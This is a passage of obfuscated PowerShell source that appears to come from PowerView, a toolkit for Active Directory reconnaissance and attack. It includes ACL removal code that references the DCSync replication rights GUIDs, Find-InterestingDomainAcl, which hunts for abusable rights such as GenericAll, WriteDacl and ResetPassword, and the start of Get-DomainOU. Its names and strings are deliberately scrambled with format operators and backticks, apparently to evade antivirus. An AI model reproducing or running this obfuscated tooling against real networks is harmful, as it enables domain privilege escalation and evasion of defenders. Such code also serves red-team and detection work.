                    ("{1}{0}"-f 'ync','DCS') { ("{5}{9}{3}{4}{8}{6}{2}{0}{7}{1}" -f'4fc2','cd2','0','-f7','9f-0','1','c','d','0','131f6aa-9c07-11d1'), ("{4}{7}{0}{6}{8}{2}{9}{3}{1}{5}"-f'1','fc2dcd','0','4','11','2','d1-f79f','31f6ad-9c07-1','-','0c0'), ("{2}{6}{0}{5}{1}{3}{4}" -f '91','-0fac','89','b','eda640c','a','e95b76-444d-4c62-9')}
                }
            }

            ForEach (${P`RIncIpA`Lob`J`e`Ct} in ${Pr`in`CIpaLS}) {
                &("{0}{1}{2}"-f'Wri','te-Ve','rbose') "[Remove-DomainObjectAcl] Removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) "

                try {
                    ${id`EnT`Ity} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${pr`IN`CIPA`LOBJE`CT}."ob`jE`cTSid")

                    if (${g`UIdS}) {
                        ForEach (${g`UID} in ${G`U`iDS}) {
                            ${Ne`wGuID} = &("{0}{3}{1}{2}"-f 'Ne','Obje','ct','w-') ("{0}{1}"-f'Gu','id') ${gu`Id}
                            ${A`dRigH`Ts} = [System.DirectoryServices.ActiveDirectoryRights] ("{1}{3}{2}{4}{0}" -f'ht','E','dRi','xtende','g')
                            ${aC`es} += &("{2}{0}{1}" -f 'w-Obj','ect','Ne') ("{3}{5}{7}{2}{1}{8}{6}{4}{0}" -f 'yAccessRule','toryService','rec','S','or','y','t','stem.Di','s.ActiveDirec') ${i`DE`NTi`TY}, ${adR`IG`HTS}, ${c`onTR`OlT`yPe}, ${N`EwG`UId}, ${inhER`Itan`c`e`TypE}
                        }
                    }
                    else {
                        
                        ${A`dR`Ights} = [System.DirectoryServices.ActiveDirectoryRights] ("{0}{2}{1}" -f 'Gene','All','ric')
                        ${A`ces} += &("{3}{1}{0}{2}"-f 'O','ew-','bject','N') ("{7}{5}{11}{1}{3}{6}{9}{4}{8}{2}{10}{0}" -f'le','ecto','ry','ryServ','veDi','ste','ices.Ac','Sy','recto','ti','AccessRu','m.Dir') ${IdEn`Ti`TY}, ${ADrI`G`hts}, ${co`NTRO`L`TYPe}, ${iNheR`I`TaNCET`YPE}
                    }

                    
                    ForEach (${a`cE} in ${a`Ces}) {
                        &("{1}{0}{2}" -f'ite','Wr','-Verbose') "[Remove-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname) "
                        ${t`ARgE`T`ENTrY} = ${tA`R`Getobj`ect}.("{0}{4}{3}{1}{2}"-f'GetDir','yE','ntry','ctor','e').Invoke()
                        ${t`AR`GeTE`NtRY}."P`sb`ASe"."O`P`TionS"."Sec`URit`yma`sKS" = ("{0}{1}"-f'D','acl')
                        ${T`Ar`G`ETeNTRY}."psb`Ase"."OBJ`Ec`TSecu`RItY".("{2}{3}{0}{1}"-f 'ss','Rule','RemoveAcc','e').Invoke(${A`cE})
                        ${TARge`T`en`TRy}."pSba`Se".("{0}{1}{2}{3}" -f'Co','m','m','itChanges').Invoke()
                    }
                }
                catch {
                    &("{0}{1}{2}{3}"-f 'W','rite-Ve','rbos','e') "[Remove-DomainObjectAcl] Error removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) : $_ "
                }
            }
        }
    }
}


function fInd-iNTe`RE`sTIng`dOM`AIN`ACl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{2}{0}"-f'cess','P','ShouldPro','S'}, '')]
    [OutputType({"{1}{2}{0}"-f'rView.ACL','Pow','e'})]
    [CmdletBinding()]
    Param (
        [Parameter(poSITioN = 0, vAlUEfROmPIpeliNE = ${T`RUE}, vALueFROMPIpElinEbYpROPERtYNAmE = ${T`RUE})]
        [Alias({"{3}{1}{2}{0}" -f 'e','mai','nNam','Do'}, {"{1}{0}"-f 'ame','N'})]
        [String]
        ${D`om`AIN},

        [Switch]
        ${ResoL`Vegui`DS},

        [String]
        [ValidateSet('All', {"{0}{2}{1}"-f'Re','ord','setPassw'}, {"{0}{1}{2}"-f'W','riteM','embers'})]
        ${Ri`GHtS`F`iLt`eR},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f'ter','l','Fi'})]
        [String]
        ${Ld`A`pfIltEr},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f 'ADS','ath','P'})]
        [String]
        ${sEA`R`ChB`ASe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{3}{2}{4}"-f 'ainContro','Dom','l','l','er'})]
        [String]
        ${sE`RVER},

        [ValidateSet({"{0}{1}" -f'Bas','e'}, {"{0}{1}"-f 'O','neLevel'}, {"{0}{1}"-f'S','ubtree'})]
        [String]
        ${SeArChS`co`PE} = ("{0}{1}" -f'Subtr','ee'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ReSUl`TPag`eSiZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${se`RveRtiMe`LIMit},

        [Switch]
        ${t`OMBsTO`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`ReDEn`T`IAL} =  $0DSQr::"eM`ptY"
    )

    BEGIN {
        ${a`cl`ARgUmE`NTS} = @{}
        if (${PSb`oU`N`dpaR`AmEteRS}[("{0}{1}{2}" -f 'Resolve','GU','IDs')]) { ${AclAR`Gume`NtS}[("{1}{2}{0}" -f 's','Resol','veGUID')] = ${ReSo`l`VEGuIds} }
        if (${PS`B`ouNDp`Ar`AmeTeRS}[("{0}{1}{2}" -f'R','ightsFi','lter')]) { ${aCl`AR`GuMEnts}[("{2}{0}{1}{3}" -f'ht','sFil','Rig','ter')] = ${Rig`Hts`FiL`TER} }
        if (${PSB`o`UNd`param`Eters}[("{0}{1}{2}" -f'LDAPF','ilte','r')]) { ${AC`LArG`U`menTs}[("{2}{1}{0}"-f'r','Filte','LDAP')] = ${L`D`Ap`FilTer} }
        if (${p`SbOUNd`paRaME`Te`RS}[("{2}{3}{0}{1}" -f'h','Base','S','earc')]) { ${acL`AR`GU`Ments}[("{0}{2}{1}"-f'SearchB','se','a')] = ${sE`ARchB`A`se} }
        if (${pSbOUNdP`AR`A`M`eTeRs}[("{0}{1}"-f'Se','rver')]) { ${aC`l`Arg`U`mEnTS}[("{1}{2}{0}"-f'r','S','erve')] = ${SEr`VEr} }
        if (${P`sB`OuN`dp`ArAM`eteRs}[("{3}{2}{0}{1}" -f 'hSco','pe','c','Sear')]) { ${A`cla`RGU`Me`NtS}[("{3}{1}{2}{0}"-f 'pe','earchSc','o','S')] = ${SEAR`Ch`ScopE} }
        if (${pS`BO`UN`d`Param`eTERs}[("{3}{1}{2}{0}" -f 'e','ageSi','z','ResultP')]) { ${aC`L`ArGuMENtS}[("{1}{2}{0}" -f'ze','Resul','tPageSi')] = ${RE`sULtPaG`ESiZE} }
        if (${pSB`oU`N`DP`ARaMEtERs}[("{0}{2}{1}{4}{3}" -f'Serve','Ti','r','t','meLimi')]) { ${aCLA`RG`Um`ENtS}[("{2}{1}{0}" -f 'rTimeLimit','erve','S')] = ${ser`VerTImeli`mit} }
        if (${PSb`O`U`Ndp`ArAmEt`eRS}[("{1}{0}" -f'stone','Tomb')]) { ${aclar`GUmE`N`Ts}[("{1}{0}{2}"-f'ombston','T','e')] = ${tO`Mb`st`ONe} }
        if (${PSb`oUn`Dpar`AMeT`eRS}[("{2}{0}{1}" -f'den','tial','Cre')]) { ${a`CL`ARgume`NTS}[("{2}{1}{0}"-f'tial','reden','C')] = ${c`RED`e`NTIal} }

        ${OBJE`cT`searCherAR`G`UMenTS} = @{
            ("{1}{0}{2}" -f'ti','Proper','es') = ("{4}{0}{2}{1}{3}"-f'accou',',obj','ntname','ectclass','sam')
            'Raw' = ${t`RUE}
        }
        if (${pSBoUN`D`Par`AMEteRs}[("{0}{1}"-f 'Serve','r')]) { ${ObjectseA`RC`her`ArgUMeN`TS}[("{2}{1}{0}" -f'ver','r','Se')] = ${SE`Rv`ER} }
        if (${PSbOUND`p`A`R`AMeTers}[("{3}{0}{2}{1}" -f'ch','ope','Sc','Sear')]) { ${ObjeCT`SEAr`cHER`A`Rg`UMen`TS}[("{1}{2}{0}"-f'chScope','S','ear')] = ${S`eAR`c`HScOPE} }
        if (${pSBou`ND`pARaMETE`RS}[("{3}{0}{1}{2}"-f'lt','PageS','ize','Resu')]) { ${oBJ`EcTsE`A`RcHeR`ARgUMe`N`Ts}[("{1}{3}{2}{0}{4}" -f'ag','R','P','esult','eSize')] = ${RES`UlTP`A`gESIze} }
        if (${PsbO`UNdPaRAm`E`TE`Rs}[("{0}{2}{3}{4}{1}" -f 'S','it','er','ve','rTimeLim')]) { ${OB`JE`CtSe`ARcHERA`Rgu`mENtS}[("{4}{3}{1}{0}{2}" -f 'eLim','rverTim','it','e','S')] = ${SErve`RTIM`ELIm`iT} }
        if (${PSbouNdP`Ar`A`m`e`TerS}[("{0}{1}{2}" -f'To','mbsto','ne')]) { ${oBjEcTSEarcHe`R`Ar`gUm`en`Ts}[("{1}{0}{2}"-f'mb','To','stone')] = ${toMb`st`o`Ne} }
        if (${p`SbOuNdp`AR`Am`eT`ERS}[("{0}{1}{2}"-f'Cre','dent','ial')]) { ${oBj`ec`TS`Ear`cherar`guMEn`TS}[("{1}{2}{0}"-f 'ential','Cre','d')] = ${CrEDEn`Ti`AL} }

        ${a`DNaMe`ARG`UMents} = @{}
        if (${Ps`BouN`DPARaM`e`Ters}[("{0}{1}"-f'Ser','ver')]) { ${AD`NAmEaRGu`mE`Nts}[("{0}{1}" -f'Ser','ver')] = ${SerV`er} }
        if (${ps`Bo`UnD`pAram`eters}[("{1}{2}{0}"-f 'ential','Cre','d')]) { ${AdN`AMear`Gu`MEnTs}[("{0}{1}{2}" -f 'Credent','ia','l')] = ${c`Re`D`entiAL} }

        
        ${reS`Ol`VE`Dsi`dS} = @{}
    }

    PROCESS {
        if (${p`S`Bo`UndPaRAMEt`ERs}[("{2}{1}{0}"-f'main','o','D')]) {
            ${Ac`LargUM`En`TS}[("{0}{1}"-f 'Dom','ain')] = ${D`omaIn}
            ${ADn`AmEArgum`E`N`TS}[("{1}{0}{2}"-f 'o','D','main')] = ${Do`M`AIn}
        }

        &("{4}{2}{3}{0}{1}{5}" -f 'ec','t','t-Doma','inObj','Ge','Acl') @ACLArguments | &("{1}{0}{3}{2}" -f 'Eac','For','ject','h-Ob') {

            if ( (${_}."A`c`Ti`V`eDIReCt`oRYr`ighTS" -match ((("{3}{4}{6}{2}{5}{1}{0}"-f'tmWriteZtmCreateZtmDelete','llZ','c','Ge','ne','A','ri'))."REP`l`ACe"('Ztm',[stRing][CHAr]124))) -or ((${_}."ACTive`diRe`c`Tor`yrIgHts" -match ("{3}{2}{0}{1}" -f 'edRigh','t','nd','Exte')) -and (${_}."aCEQu`Al`iFiER" -match ("{0}{1}" -f 'A','llow')))) {
                
                if (${_}."sECuR`I`TYID`eNTI`F`IEr"."Va`Lue" -match '^S-1-5-.*-[1-9]\d{3,}$') {
                    if (${r`ESo`L`VeDsidS}[${_}."S`ecUr`IT`YI`deNt`ifIeR"."V`ALUE"]) {
                        ${Ide`N`T`I`TYREF`E`REncEname}, ${I`Den`TITYREfEr`eN`ce`dOmAiN}, ${I`dEntiTYr`Ef`eREn`CEdn}, ${ID`ENtiTy`REf`ERen`C`EclaSs} = ${r`ESOLVEdSi`ds}[${_}."SECU`R`ITyIDen`TIFieR"."V`Alue"]

                        ${inte`RESti`NG`A`CL} = &("{0}{1}{2}"-f'N','ew-Obje','ct') ("{1}{2}{0}" -f'ct','P','SObje')
                        ${in`Te`R`eSTINgACl} | &("{0}{1}{2}" -f 'Add-','M','ember') ("{3}{0}{2}{1}"-f'r','y','t','NotePrope') ("{1}{0}"-f 'DN','Object') ${_}."OBje`C`TDn"
                        ${interEsTi`N`gA`cl} | &("{0}{3}{1}{2}" -f'Add','Mem','ber','-') ("{2}{1}{0}" -f 'ty','teProper','No') ("{3}{0}{1}{2}"-f 'ifi','e','r','AceQual') ${_}."aCeq`UA`Li`FiEr"
                        ${i`NT`eRestI`NGacL} | &("{1}{0}{2}" -f 'dd-Memb','A','er') ("{0}{2}{1}"-f 'N','rty','otePrope') ("{1}{3}{2}{0}" -f's','Acti','yRight','veDirector') ${_}."AcTI`V`E`d`IrECTorY`RIgHTs"
                        if (${_}."Object`A`CET`ype") {
                            ${IN`T`eR`EstIngACl} | &("{0}{1}{2}"-f'Add','-Membe','r') ("{1}{0}{3}{2}" -f 'otePro','N','y','pert') ("{0}{2}{1}{3}"-f'ObjectA','T','ce','ype') ${_}."OBJe`CTAc`E`T`YpE"
                        }
                        else {
                            ${iN`Te`RES`TINgA`CL} | &("{3}{0}{2}{1}"-f 'dd-','mber','Me','A') ("{3}{1}{2}{0}"-f'rty','tePr','ope','No') ("{2}{1}{0}" -f 'ype','eT','ObjectAc') ("{0}{1}"-f'Non','e')
                        }
                        ${iNter`es`TIn`GaCL} | &("{3}{2}{1}{0}"-f'ber','Mem','-','Add') ("{0}{2}{3}{1}"-f 'Note','ty','Prop','er') ("{1}{0}"-f'ceFlags','A') ${_}."acEfl`A`gs"
                        ${I`Nt`ERe`STi`NgaCl} | &("{1}{0}{3}{2}" -f'dd','A','mber','-Me') ("{0}{3}{2}{1}"-f'Not','y','t','eProper') ("{1}{0}"-f 'ype','AceT') ${_}."Acety`pe"
                        ${InTe`R`EStiN`GACl} | &("{1}{2}{0}"-f'ember','Ad','d-M') ("{1}{0}{3}{2}"-f'e','Not','perty','Pro') ("{1}{0}{3}{2}"-f 'ta','Inheri','s','nceFlag') ${_}."IN`heRITanC`efL`Ags"
                        ${iNtEreS`T`InGacL} | &("{0}{1}{2}"-f 'Add-','Memb','er') ("{0}{1}{2}"-f'Not','eProp','erty') ("{2}{1}{0}{3}" -f'u','ec','S','rityIdentifier') ${_}."sEcUrITY`IDE`N`Ti`F`IEr"
                        ${i`Nte`RES`TinGA`CL} | &("{0}{1}{2}{3}"-f'Ad','d-Me','mbe','r') ("{2}{0}{3}{1}"-f'Pro','y','Note','pert') ("{2}{0}{3}{4}{1}"-f 'ti','ame','Iden','tyRefer','enceN') ${iD`ENtITY`REFE`Renc`En`A`Me}
                        ${i`NTereST`Ing`AcL} | &("{2}{0}{1}" -f '-Me','mber','Add') ("{1}{2}{0}" -f'rty','Not','ePrope') ("{2}{1}{3}{4}{0}" -f 'renceDomain','dent','I','ity','Refe') ${IdeNTITYrEFEReN`c`e`D`oMaiN}
                        ${INtE`REst`iNG`ACL} | &("{2}{1}{0}{3}"-f'e','Memb','Add-','r') ("{1}{3}{0}{2}"-f'Prope','N','rty','ote') ("{2}{3}{1}{0}{5}{4}" -f'c','yReferen','Id','entit','DN','e') ${I`De`NtiTyR`Ef`ErencEDn}
                        ${IntEr`eS`TIn`G`ACL} | &("{2}{1}{3}{0}"-f 'er','d','A','d-Memb') ("{0}{1}{2}" -f'NoteProp','e','rty') ("{1}{2}{3}{4}{5}{0}" -f'ss','Identi','tyR','ef','ere','nceCla') ${ID`E`NTIt`YREfere`N`ceClASs}
                        ${i`NteRESt`i`NGaCL}
                    }
                    else {
                        ${Ide`NtIty`REFe`R`EN`Cedn} = &("{2}{1}{0}{3}"-f'N','rt-AD','Conve','ame') -Identity ${_}."S`ecur`I`TyIDENtifiER"."v`ALue" -OutputType ('DN') @ADNameArguments
                        

                        if (${i`dEntItyReFE`R`eNcEdn}) {
                            ${IdE`Nt`ityrefeReNCE`do`MaIn} = ${IDEn`TiT`yR`EfeRenC`Edn}.("{1}{0}{2}"-f 'St','Sub','ring').Invoke(${IdenTitY`R`E`FE`REn`cEDN}.("{2}{1}{0}"-f'xOf','de','In').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                            
                            ${o`B`jEcts`eaRCherARGUm`En`Ts}[("{1}{0}{2}"-f 'o','D','main')] = ${I`DEntiTyrEfErE`N`c`E`D`oMAin}
                            ${objE`CtsE`ArCh`eRARGu`MeN`TS}[("{2}{0}{1}" -f'en','tity','Id')] = ${Ide`Ntit`yr`efeRENcE`dn}
                            
                            ${o`B`JecT} = &("{3}{0}{2}{4}{1}" -f'Do','Object','mai','Get-','n') @ObjectSearcherArguments

                            if (${O`Bj`eCt}) {
                                ${ide`NtITy`REf`er`eNc`eNa`me} = ${ObJE`ct}."PrOpER`Ti`eS"."S`Am`AcCOu`NTNAme"[0]
                                if (${O`BJ`ecT}."Pr`oP`ertIEs"."oBJ`EcTClA`Ss" -match ("{1}{0}"-f 'er','comput')) {
                                    ${iDe`N`TItY`Ref`e`Re`NCeClaSS} = ("{2}{1}{0}" -f'uter','mp','co')
                                }
                                elseif (${ObJ`ect}."pr`OPe`RTIeS"."obJ`ectC`lAsS" -match ("{0}{1}"-f'gr','oup')) {
                                    ${IdeNTI`TyRE`FeRE`Nc`EC`LASS} = ("{0}{1}"-f'gr','oup')
                                }
                                elseif (${oB`Je`cT}."P`RopERt`Ies"."o`BJECtCl`A`Ss" -match ("{0}{1}"-f 'u','ser')) {
                                    ${i`dENT`ityr`efERenC`ECLaSS} = ("{1}{0}" -f 'r','use')
                                }
                                else {
                                    ${IDeN`TiTYREF`e`ReNceC`l`Ass} = ${NU`lL}
                                }

                                
                                ${Re`SOLved`s`IDs}[${_}."sECuRI`TYi`dE`NTi`FIer"."va`LUE"] = ${idEnTit`yRef`ER`Ence`N`Ame}, ${iD`EnTiT`yRE`F`er`EnCeDO`maiN}, ${id`e`NTItYREf`E`RenCEdn}, ${IdeNTi`Ty`REf`e`ReNcEClass}

                                ${iNTEreS`Tin`g`AcL} = &("{2}{1}{0}" -f 'ect','Obj','New-') ("{1}{0}{2}"-f'Ob','PS','ject')
                                ${iNTere`s`T`iNg`Acl} | &("{2}{0}{1}"-f'd-Memb','er','Ad') ("{3}{0}{1}{2}"-f 'pe','r','ty','NotePro') ("{2}{0}{1}"-f'ctD','N','Obje') ${_}."oBJ`eC`TdN"
                                ${iNTEREStin`GA`CL} | &("{1}{2}{0}"-f'd-Member','A','d') ("{1}{2}{0}"-f 'operty','N','otePr') ("{1}{2}{0}{3}" -f 'ali','AceQ','u','fier') ${_}."Ac`EQU`AlifIEr"
                                ${i`NTE`REst`IN`GACL} | &("{0}{2}{1}" -f'Add-Memb','r','e') ("{0}{1}{3}{2}"-f 'No','teP','operty','r') ("{1}{2}{0}{3}"-f'ryRig','Acti','veDirecto','hts') ${_}."Acti`VE`dI`Re`cTorY`RIgHtS"
                                if (${_}."oB`jec`TAc`EtYPe") {
                                    ${inTer`ES`TI`Nga`CL} | &("{2}{0}{1}"-f'-Mem','ber','Add') ("{1}{0}{2}" -f 'er','NoteProp','ty') ("{1}{3}{0}{2}" -f 'ce','Ob','Type','jectA') ${_}."OBj`E`ct`AcEtyPE"
                                }
                                else {
                                    ${IntEreStInG`A`cL} | &("{2}{1}{0}"-f'r','dd-Membe','A') ("{0}{2}{3}{1}"-f 'NotePr','ty','ope','r') ("{2}{0}{4}{1}{3}" -f 't','eTy','Objec','pe','Ac') ("{1}{0}"-f 'e','Non')
                                }
                                ${InTe`RE`st`INgA`CL} | &("{0}{2}{1}"-f'Ad','Member','d-') ("{0}{1}{3}{2}" -f 'N','ot','ty','eProper') ("{0}{2}{1}"-f'AceFl','gs','a') ${_}."AcE`Fla`gS"
                                ${i`NtEResti`N`GaCl} | &("{1}{0}{2}" -f'-Membe','Add','r') ("{1}{0}{2}"-f 'op','NotePr','erty') ("{2}{1}{0}"-f 'e','eTyp','Ac') ${_}."aceT`yPE"
                                ${INt`eREs`T`iNgAcL} | &("{2}{1}{0}" -f 'Member','d-','Ad') ("{0}{1}{2}" -f'No','tePropert','y') ("{4}{0}{2}{1}{3}"-f'eritanc','l','eF','ags','Inh') ${_}."iNhE`RiTancE`FL`AgS"
                                ${INTeRES`TING`A`cL} | &("{0}{2}{1}"-f 'Ad','r','d-Membe') ("{3}{2}{0}{1}" -f 'opert','y','ePr','Not') ("{0}{4}{3}{2}{1}"-f'Secur','r','entifie','Id','ity') ${_}."sec`URi`TY`IdeNtIFier"
                                ${INT`eReS`TI`NG`ACl} | &("{1}{0}{2}" -f'e','Add-M','mber') ("{3}{0}{2}{1}" -f 'ote','rty','Prope','N') ("{0}{4}{1}{2}{3}{5}" -f 'IdentityR','e','nc','eN','efer','ame') ${iD`Ent`ITYR`EFEr`eNce`NAMe}
                                ${InTE`REsTi`NGA`CL} | &("{1}{2}{0}" -f 'Member','Ad','d-') ("{0}{1}{2}" -f'Note','P','roperty') ("{6}{4}{0}{2}{1}{5}{3}"-f 'i','fere','tyRe','ceDomain','dent','n','I') ${id`e`N`TITy`R`eFERENcedo`mAIn}
                                ${iNte`REst`I`N`gACl} | &("{1}{0}{2}"-f 'mb','Add-Me','er') ("{0}{1}{3}{2}"-f'Not','eP','erty','rop') ("{0}{3}{4}{1}{5}{2}"-f'Id','tyRefer','N','en','ti','enceD') ${i`D`eNTi`T`YrE`FE`RenCeDn}
                                ${i`Nt`e`REstIng`Acl} | &("{1}{0}{3}{2}"-f'-','Add','r','Membe') ("{0}{1}{3}{2}"-f 'No','te','roperty','P') ("{3}{1}{0}{4}{2}"-f'renc','entityRefe','s','Id','eClas') ${idEn`TIt`YR`ef`ERE`NcEcl`Ass}
                                ${i`NTe`REs`Tin`gaCL}
                            }
                        }
                        else {
                            &("{2}{1}{0}"-f'ing','te-Warn','Wri') "[Find-InterestingDomainAcl] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with Convert-ADName "
                        }
                    }
                }
            }
        }
    }
}


function G`eT-do`mAi`Nou {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{3}{2}"-f 'Sh','PS','Process','ould'}, '')]
    [OutputType({"{1}{3}{0}{2}" -f '.','Po','OU','werView'})]
    [CmdletBinding()]
    Param (
        [Parameter(pOSItION = 0, valuEFrOmPipeliNe = ${t`RUE}, ValUefRompiPELINEByPROpErTyNaMe = ${T`RUe})]
        [Alias({"{1}{0}"-f'ame','N'})]
        [String[]]
        ${i`d`entITY},

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias({"{1}{0}"-f'UID','G'})]
        ${g`PlI`Nk},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Do`MA`In},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}"-f'ilte','r','F'})]
        [String]
        ${LD`Ap`F`ilTer},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pr`oPeR`TI`Es},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'ADS','Path'})]
        [String]
        ${s`E`A`RcHbAsE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{0}{2}{1}"-f'inCo','ler','ntrol','Doma'})]
        [String]
        ${s`E`RVeR},

        [ValidateSet({"{1}{0}" -f 'e','Bas'}, {"{0}{2}{1}" -f'O','vel','neLe'}, {"{2}{1}{0}" -f'ree','t','Sub'})]
        [String]
        ${S`e`ARchsCo`Pe} = ("{0}{2}{1}" -f 'S','ree','ubt'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RE`SuLtPA`gE`siZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sERV`Er`TimEL`IM`iT},

        [ValidateSet({"{0}{1}"-f'Dac','l'}, {"{0}{1}" -f'Grou','p'}, {"{1}{0}"-f'e','Non'}, {"{0}{1}" -f 'Owne','r'}, {"{1}{0}" -f 'acl','S'})]
        [String]
        ${s`ECU`RiT`yMaSkS},

        [Switch]
        ${T`OMB`sTonE},

        [Alias({"{2}{0}{1}" -f'tur','nOne','Re'})]
        [Switch]
        ${FiN`do`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`EDeNT`Ial} =   (gEt-vARiablE  0DSqr  -ValueO )::"emP`TY",

        [Switch]
        ${R`AW}
    )

    BEGIN {
        ${sEARcHE`RA`R`gumE`Nts} = @{}
        if (${psbo`U`N`dpaRaMeT`ERs}[("{1}{0}"-f 'in','Doma')]) { ${seAr`CHEr`A`RGumen`TS}[("{1}{0}" -f 'ain','Dom')] = ${dO`M`AIN} }
        if (${ps`BOUND`PAr`AmEteRS}[("{2}{1}{0}" -f 'ties','er','Prop')]) { ${SE`A`RCHERA`RG`UMeNTS}[("{2}{0}{1}" -f'er','ties','Prop')] = ${proP`er`TIes} }
        if (${P`sBoUn`dPAr`Am`eterS}[("{0}{1}{2}"-f 'Se','arc','hBase')]) { ${sEArCHE`R`ARgUm`ents}[("{2}{1}{0}" -f 'Base','h','Searc')] = ${SEAr`ch`BA`SE} }
        if (${PSb`OUNDP`A`RamETErs}[("{1}{0}" -f'rver','Se')]) { ${seaRC`HEr`AR`g`UMENts}[("{0}{1}"-f 'Ser','ver')] = ${Ser`VEr} }
        if (${Ps`BoUN`DP`ArA`m`etErS}[("{0}{3}{2}{1}"-f 'Sea','Scope','ch','r')]) { ${s`eARCheR`A`RGumE`NTs}[("{0}{1}{2}"-f 'S','earchScop','e')] = ${SEA`Rc`HSc`OpE} }
        if (${psb`ou`ND`p`ARAM`etErS}[("{2}{4}{0}{3}{1}"-f 'tP','ze','R','ageSi','esul')]) { ${Se`A`RCH`eRArG`UmENTS}[("{0}{2}{1}" -f 'Resul','ageSize','tP')] = ${Re`s`ULtP`A`gesIzE} }
        if (${P`SB`ouN`dpA`RAMetERs}[("{1}{2}{0}" -f 'eLimit','Se','rverTim')]) { ${S`E`ARcheR`A`RGUMen`TS}[("{3}{2}{1}{0}" -f't','eLimi','m','ServerTi')] = ${S`ER`Ve`RT`ImELIMIT} }
        if (${pS`BOU`N`d`Para`meteRS}[("{2}{0}{1}" -f 'it','yMasks','Secur')]) { ${sEarCh`eR`A`RG`UmEntS}[("{0}{2}{1}" -f'Securi','asks','tyM')] = ${S`eCUR`itym`AskS} }
        if (${PSBOUN`dparam`et`eRs}[("{1}{2}{0}" -f 'mbstone','T','o')]) { ${SEArchErarG`UMe`N`TS}[("{0}{2}{1}" -f 'T','ne','ombsto')] = ${Tom`B`stOne} }
        if (${P`SbouNdP`A`RAMete`RS}[("{0}{1}{2}" -f 'Cre','dent','ial')]) { ${SEaR`c`heR`ARgUM`En`Ts}[("{0}{1}{2}" -f'Creden','ti','al')] = ${creD`E`NTial} }
        ${o`UseAR`cher} = &("{0}{4}{1}{3}{2}" -f'Get','Domai','Searcher','n','-') @SearcherArguments
    }

    PROCESS {
        if (${O`Us`ea`RcHEr}) {
            ${I`de`NtITYFiLT`ER} = ''
            ${Fi`l`TER} = ''
            ${I`d`eNTitY} | &("{0}{1}{2}"-f'Wher','e-Objec','t') {${_}} | &("{3}{1}{4}{2}{0}"-f 'ject','ach','b','ForE','-O') {
                ${iD`e`Nt`ItY`Ins`TancE} = ${_}.("{0}{1}"-f 'R','eplace').Invoke('(', '\28').("{1}{0}"-f 'ce','Repla').Invoke(')', '\29')
                if (${idEntIT`yin`ST`A`NcE} -match ("{1}{0}" -f'*','^OU=.')) {
                    ${iDe`NTi`TyfILt`er} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${pSBou`Nd`PA`RAMEtERs}[("{1}{0}{2}" -f'mai','Do','n')]) -and (-not ${pSBoUN`dPAR`AmE`T`ERS}[("{0}{1}{2}" -f'Se','arch','Base')])) {
                        
                        
                        ${I`dENtI`TYd`Oma`iN} = ${IdeNT`IT`yiN`s`Ta`Nce}.("{0}{1}"-f 'SubStr','ing').Invoke(${iD`ENt`iT`yInSt`Ance}.("{2}{0}{1}" -f 'exO','f','Ind').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{1}{0}{2}" -f'r','W','ite-Verbose') ('['+'Get-Dom'+'ai'+'nOU]'+' '+'Ex'+'tr'+'ac'+'ted '+'dom'+'ain'+' '+"'$IdentityDomain' "+'from'+' '+"'$IdentityInstance'")
                        ${seA`Rc`He`RAR`g`UMEnTs}[("{0}{1}"-f 'Domai','n')] = ${id`enTIT`ydoMain}
                        ${ou`seAr`cheR} = &("{1}{2}{4}{3}{0}" -f'rcher','G','et-Do','nSea','mai') @SearcherArguments
                        if (-not ${oU`SEarch`Er}) {
                            &("{3}{0}{2}{1}" -f 'te-Warn','ng','i','Wri') ('[Get'+'-Do'+'ma'+'inOU]'+' '+'U'+'nabl'+'e '+'to'+' '+'retr'+'i'+'eve '+'dom'+'ain'+' '+'sea'+'rcher'+' '+'f'+'or '+"'$IdentityDomain'")
                        }
                    }
                }
                else {
                    try {
                        ${g`U`IdbYTE`stRing} = (-Join (([Guid]${Identity`in`sTA`NcE}).("{2}{1}{3}{0}"-f'y','oByteAr','T','ra').Invoke() | &("{2}{1}{3}{4}{0}"-f't','Eac','For','h-Obje','c') {${_}.("{1}{0}{2}"-f'Str','To','ing').Invoke('X').("{2}{0}{1}" -f'ad','Left','P').Invoke(2,'0')})) -Replace (("{1}{0}"-f ')','(..')),'\$1'
                        ${ID`E`NTIt`yFIlTer} += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        ${Id`E`N`TITYfi`LtER} += "(name=$IdentityInstance)"
                    }
                }
            }
            if (${IdeNTiTyfIl`T`er} -and (${iDENTityF`Il`T`er}.("{1}{0}" -f 'rim','T').Invoke() -ne '') ) {
                ${F`i`ltER} += "(|$IdentityFilter)"
            }

            if (${p`sb`OUNdParamE`T`e`Rs}[("{0}{1}{2}"-f'GPL','in','k')]) {
